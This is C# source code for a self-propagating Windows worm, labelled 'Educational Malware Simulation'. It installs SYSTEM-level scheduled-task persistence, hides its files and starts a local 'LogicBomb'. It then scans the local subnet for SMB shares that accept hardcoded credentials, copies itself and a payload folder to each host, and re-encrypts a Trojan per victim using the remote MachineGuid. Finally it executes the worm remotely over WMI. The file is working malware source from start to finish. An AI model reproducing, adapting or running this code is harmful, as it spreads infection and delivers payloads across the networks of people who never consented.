using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
using Microsoft.Win32;
using SharedCrypto;

class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string WORM_EXE_NAME = "Worm.exe";
    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";

    // Constants for dependencies
    private const string SHARED_CRYPTO_DLL = "SharedCrypto.dll";
    private const string SHARED_CRYPTO_PDB = "SharedCrypto.pdb";

    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_INTERVAL_MINUTES = 10;

    private const string WORM_TASK_NAME = "MaliciousWorm_Persistence";
    private const string LOGICBOMB_TASK_NAME = "MaliciousLogicBomb_Monitor";

    private static string logFilePath;

    static async Task Main()
    {
        Console.WriteLine("===========================================");
        Console.WriteLine("PERSISTENT SELF-PROPAGATING WORM");
        Console.WriteLine("Educational Malware Simulation");
        Console.WriteLine("===========================================");
        Console.WriteLine();

        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        logFilePath = Path.Combine(baseDir, "worm_activity.log");

        LogToFile("========================================");
        LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
        LogToFile($"Base Directory: {baseDir}");
        LogToFile("========================================");

        try
        {
            LogInfo("Installing persistence...");
            InstallPersistence();

            LogInfo("Setting file attributes...");
            SetFileAttributes();

            LogInfo("Starting LogicBomb locally...");
            StartLogicBombLocally();

            LogInfo("Starting continuous network scanning...");
            await ContinuousScanLoop();
        }
        catch (Exception ex)
        {
            LogError($"Critical error in main loop: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
    }

    private static void InstallPersistence()
    {
        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string wormPath = Process.GetCurrentProcess().MainModule.FileName;
            string logicBombPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME, LOGICBOMB_EXE_NAME);

            if (CreateScheduledTask(WORM_TASK_NAME, wormPath))
                LogSuccess($"Worm persistence installed: {WORM_TASK_NAME}");
            else
                LogWarning($"Failed to create Worm scheduled task.");

            if (File.Exists(logicBombPath))
            {
                if (CreateScheduledTask(LOGICBOMB_TASK_NAME, logicBombPath))
                    LogSuccess($"LogicBomb persistence installed: {LOGICBOMB_TASK_NAME}");
                else
                    LogWarning($"Failed to create LogicBomb scheduled task.");
            }
            else
            {
                LogWarning($"LogicBomb.exe not found at {logicBombPath}, skipping persistence.");
            }
        }
        catch (Exception ex)
        {
            LogError($"Persistence installation failed: {ex.Message}");
        }
    }

    private static bool CreateScheduledTask(string taskName, string exePath)
    {
        try
        {
            // Delete existing task to ensure a clean state
            var deleteTask = new ProcessStartInfo("schtasks.exe", $"/Delete /TN \"{taskName}\" /F")
            { CreateNoWindow = true, UseShellExecute = false };
            Process.Start(deleteTask)?.WaitForExit();

            // Create new task to run on startup as SYSTEM
            var createTask = new ProcessStartInfo("schtasks.exe", $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true
            };

            using (var process = Process.Start(createTask))
            {
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                if (process.ExitCode == 0) return true;
                LogToFile($"Failed to create task {taskName}: {error}");
                return false;
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Exception creating task {taskName}: {ex.Message}");
            return false;
        }
    }

    private static void SetFileAttributes()
    {
        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;

            void SetAttrs(string fileName)
            {
                string filePath = Path.Combine(baseDir, fileName);
                if (File.Exists(filePath))
                {
                    File.SetAttributes(filePath, FileAttributes.Hidden | FileAttributes.System);
                    LogSuccess($"Set attributes for {fileName}");
                }
            }

            SetAttrs(WORM_EXE_NAME);
            SetAttrs(SHARED_CRYPTO_DLL);
            SetAttrs(SHARED_CRYPTO_PDB);

            string payloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
            if (Directory.Exists(payloadDir))
            {
                foreach (string file in Directory.GetFiles(payloadDir, "*.*", SearchOption.AllDirectories))
                {
                    try { File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }
                LogSuccess($"Set attributes for payload folder contents");
            }
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to set file attributes: {ex.Message}");
        }
    }

    private static void StartLogicBombLocally()
    {
        try
        {
            string logicBombPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME, LOGICBOMB_EXE_NAME);
            if (!File.Exists(logicBombPath))
            {
                LogWarning("LogicBomb.exe not found, skipping local start.");
                return;
            }

            if (Process.GetProcessesByName("LogicBomb").Any())
            {
                LogInfo("LogicBomb already running locally.");
                return;
            }

            var psi = new ProcessStartInfo(logicBombPath) { UseShellExecute = true, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden };
            Process.Start(psi);
            LogSuccess("LogicBomb started locally.");
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to start LogicBomb locally: {ex.Message}");
        }
    }

    private static async Task ContinuousScanLoop()
    {
        int scanCount = 0;
        while (true)
        {
            scanCount++;
            LogInfo($"========== SCAN #{scanCount} STARTED AT {DateTime.Now:HH:mm:ss} ==========");
            try
            {
                string localIP = GetLocalIPAddress();
                if (string.IsNullOrEmpty(localIP))
                {
                    LogError("Could not detect local IP address.");
                }
                else
                {
                    string baseIP = string.Join(".", localIP.Split('.').Take(3));
                    LogInfo($"Local IP: {localIP} | Scanning network: {baseIP}.1-254");

                    List<string> smbHosts = await FindSmbServersAsync(baseIP);
                    LogInfo($"Scan complete: Found {smbHosts.Count} potential target(s).");

                    if (smbHosts.Any())
                    {
                        string tempFolder = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
                        PrepareDeploymentPackage(tempFolder);

                        foreach (string ip in smbHosts)
                        {
                            await ProcessTargetHost(ip, tempFolder);
                        }

                        if (Directory.Exists(tempFolder)) Directory.Delete(tempFolder, true);
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Error during scan #{scanCount}: {ex.Message}");
            }

            LogInfo($"Scan #{scanCount} complete. Waiting {SCAN_INTERVAL_MINUTES} minutes...");
            await Task.Delay(TimeSpan.FromMinutes(SCAN_INTERVAL_MINUTES));
        }
    }

    private static async Task ProcessTargetHost(string ip, string tempFolder)
    {
        LogInfo($"--- Processing target: {ip} ---");
        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";

        if (IsWormAlreadyRunningOnTarget(ip))
        {
            LogInfo($"Worm already running on {ip}, skipping.");
            return;
        }

        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);
        if (smbConnectResult != 0)
        {
            LogWarning($"SMB connection to {ip} failed: {GetWNetErrorDescription(smbConnectResult)}");
            return;
        }

        LogSuccess($"Connected to {ip}");
        bool propagationSucceeded = true;
        try
        {
            string victimMachineGuid = GetRemoteMachineGuid(ip, SMB_USERNAME, SMB_PASSWORD);
            LogInfo($"Victim Machine GUID: {victimMachineGuid}");

            string victimSpecificBomb = Path.Combine(tempFolder, "bomb_victim.encrypted");
            ReEncryptTrojanForVictim(tempFolder, victimSpecificBomb, victimMachineGuid);

            // Helper to copy files and manage success flag
            void CopyFileToRemote(string fileName)
            {
                if (!propagationSucceeded) return;
                try
                {
                    string localPath = Path.Combine(tempFolder, fileName);
                    string remotePath = Path.Combine(remoteShareUNC, fileName);
                    File.Copy(localPath, remotePath, true);
                    LogSuccess($"Copied {fileName} to {ip}");
                }
                catch (Exception ex)
                {
                    LogError($"Failed to copy {fileName}: {ex.Message}");
                    propagationSucceeded = false;
                }
            }

            CopyFileToRemote(WORM_EXE_NAME);
            CopyFileToRemote(SHARED_CRYPTO_DLL);
            CopyFileToRemote(SHARED_CRYPTO_PDB);

            if (propagationSucceeded)
            {
                try
                {
                    string localPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
                    string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
                    await CopyFolderAsync(localPayloadFolder, remotePayloadFolder);
                    LogSuccess($"'{PAYLOAD_FOLDER_NAME}' folder copied successfully.");
                }
                catch (Exception ex)
                {
                    LogError($"Failed to copy '{PAYLOAD_FOLDER_NAME}' folder: {ex.Message}");
                    propagationSucceeded = false;
                }
            }

            if (propagationSucceeded)
            {
                try
                {
                    string remoteBombPath = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
                    if (File.Exists(remoteBombPath)) File.Delete(remoteBombPath);
                    File.Copy(victimSpecificBomb, remoteBombPath, false);
                    LogSuccess($"Re-encrypted bomb copied successfully.");
                }
                catch (Exception ex)
                {
                    LogError($"Failed to replace the encrypted bomb: {ex.Message}");
                    propagationSucceeded = false;
                }
            }

            if (propagationSucceeded)
            {
                LogSuccess($"All files copied successfully to {ip}");
                SetRemoteFileAttributes(ip, remoteShareUNC);

                string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
                LogInfo($"Attempting to execute Worm remotely on {ip} via WMI...");
                if (ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath, "Worm"))
                    LogSuccess($"Successfully propagated and executed on {ip}.");
                else
                    LogWarning($"File copy succeeded but execution failed on {ip}.");
            }
            else
            {
                LogError($"Propagation to {ip} failed due to file copy errors.");
            }
        }
        catch (Exception ex)
        {
            LogError($"A critical error occurred while processing {ip}: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
        finally
        {
            DisconnectFromRemoteShare(remoteShareUNC);
        }
    }

    private static bool IsWormAlreadyRunningOnTarget(string remoteIp)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = SMB_USERNAME, Password = SMB_PASSWORD, Timeout = TimeSpan.FromSeconds(10) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            var query = new ObjectQuery("SELECT * FROM Win32_Process WHERE Name = 'Worm.exe'");
            return new ManagementObjectSearcher(scope, query).Get().Count > 0;
        }
        catch { return false; }
    }

    private static void SetRemoteFileAttributes(string remoteIp, string remoteShareUNC)
    {
        try
        {
            void SetRemoteAttrs(string fileName)
            {
                string remotePath = Path.Combine(remoteShareUNC, fileName);
                if (File.Exists(remotePath))
                {
                    File.SetAttributes(remotePath, FileAttributes.Hidden | FileAttributes.System);
                }
            }

            SetRemoteAttrs(WORM_EXE_NAME);
            SetRemoteAttrs(SHARED_CRYPTO_DLL);
            SetRemoteAttrs(SHARED_CRYPTO_PDB);

            string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
            if (Directory.Exists(remotePayloadFolder))
            {
                foreach (string file in Directory.GetFiles(remotePayloadFolder, "*.*", SearchOption.AllDirectories))
                {
                    try { File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }
            }
            LogSuccess($"Set file attributes on {remoteIp}");
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to set attributes on {remoteIp}: {ex.Message}");
        }
    }

    private static string GetRemoteMachineGuid(string remoteIp, string username, string password)
    {
        LogInfo($"Querying Machine GUID from {remoteIp}...");
        try
        {
            var connOpts = new ConnectionOptions { Username = username, Password = password, Timeout = TimeSpan.FromSeconds(15) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\CIMV2", connOpts);
            scope.Connect();

            var regProv = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
            var inParams = regProv.GetMethodParameters("GetStringValue");
            inParams["hDefKey"] = 0x80000002; // HKEY_LOCAL_MACHINE
            inParams["sSubKeyName"] = @"SOFTWARE\Microsoft\Cryptography";
            inParams["sValueName"] = "MachineGuid";

            var outParams = regProv.InvokeMethod("GetStringValue", inParams, null);
            if (outParams?["sValue"] != null && !string.IsNullOrEmpty(outParams["sValue"].ToString()))
            {
                return outParams["sValue"].ToString();
            }
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to get Machine GUID from {remoteIp}: {ex.Message}");
        }
        return "DEFAULT_MACHINE_ID";
    }

    private static void ReEncryptTrojanForVictim(string tempFolder, string outputPath, string victimMachineGuid)
    {
        string trojanPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, "Trojan.exe");
        if (!File.Exists(trojanPath))
        {
            string localBombPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
            if (File.Exists(localBombPath))
            {
                string localMachineGuid = CryptoUtils.GetMachineGuid();
                CryptoUtils.DecryptFile(localBombPath, trojanPath, localMachineGuid);
            }
            else
            {
                throw new FileNotFoundException($"Encrypted bomb not found at {localBombPath}");
            }
        }
        CryptoUtils.EncryptFile(trojanPath, outputPath, victimMachineGuid);
    }

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var activeHosts = new List<string>();
        var tasks = new List<Task>();
        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);

        for (int i = 1; i <= 254; i++)
        {
            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync();
            tasks.Add(Task.Run(async () =>
            {
                try
                {
                    using (var ping = new Ping())
                    {
                        if ((await ping.SendPingAsync(ip, PING_TIMEOUT_MS)).Status == IPStatus.Success)
                        {
                            string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
                            if (ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD) == 0)
                            {
                                lock (activeHosts) activeHosts.Add(ip);
                                DisconnectFromRemoteShare(smbPath);
                            }
                        }
                    }
                }
                catch { }
                finally { semaphore.Release(); }
            }));
        }
        await Task.WhenAll(tasks);
        return activeHosts;
    }

    private static void PrepareDeploymentPackage(string tempFolder)
    {
        Directory.CreateDirectory(tempFolder);
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;

        void CopyToTemp(string fileName)
        {
            string sourcePath = Path.Combine(baseDir, fileName);
            if (File.Exists(sourcePath))
            {
                File.Copy(sourcePath, Path.Combine(tempFolder, fileName), true);
            }
        }

        CopyToTemp(WORM_EXE_NAME);
        CopyToTemp(SHARED_CRYPTO_DLL);
        CopyToTemp(SHARED_CRYPTO_PDB);

        string payloadFolder = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
        if (Directory.Exists(payloadFolder))
        {
            CopyFolderSync(payloadFolder, Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME));
        }
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
        foreach (string dir in Directory.GetDirectories(source))
            CopyFolderSync(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        var fileTasks = Directory.GetFiles(source).Select(file => Task.Run(() =>
            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true)));
        await Task.WhenAll(fileTasks);
        foreach (string dir in Directory.GetDirectories(source))
            await CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            return System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()).AddressList
                .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
        }
        catch { return null; }
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string command, string componentName)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = username, Password = password, Timeout = TimeSpan.FromSeconds(30) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
            {
                var inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = command;
                var outParams = processClass.InvokeMethod("Create", inParams, null);
                return outParams != null && (Convert.ToInt32(outParams["returnValue"]) == 0 || Convert.ToInt32(outParams["returnValue"]) == 2);
            }
        }
        catch { return false; }
    }

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);
    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE { dwType = 1, lpRemoteName = remotePath };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        try { WNetCancelConnection2(remotePath, 0, true); } catch { }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope, dwType, dwDisplayType, dwUsage;
        public string lpLocalName, lpRemoteName, lpComment, lpProvider;
    }

    private static void LogToFile(string message)
    {
        try { File.AppendAllText(logFilePath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}{Environment.NewLine}"); } catch { }
    }
    private static void Log(string message, ConsoleColor color) { Console.ForegroundColor = color; Console.WriteLine(message); Console.ResetColor(); LogToFile(message); }
    private static void LogInfo(string message) => Log($"[INFO] {message}", ConsoleColor.Cyan);
    private static void LogSuccess(string message) => Log($"[SUCCESS] {message}", ConsoleColor.Green);
    private static void LogWarning(string message) => Log($"[WARNING] {message}", ConsoleColor.Yellow);
    private static void LogError(string message) => Log($"[ERROR] {message}", ConsoleColor.Red);

    private static string GetWNetErrorDescription(int code)
    {
        switch (code)
        {
            case 5: return "Access is denied";
            case 53: return "The network path was not found";
            case 86: return "The specified network password is not correct";
            case 1219: return "Multiple connections to a server not allowed";
            case 1326: return "Logon failure: unknown user name or bad password";
            default: return $"WNet Error Code {code}";
        }
    }
}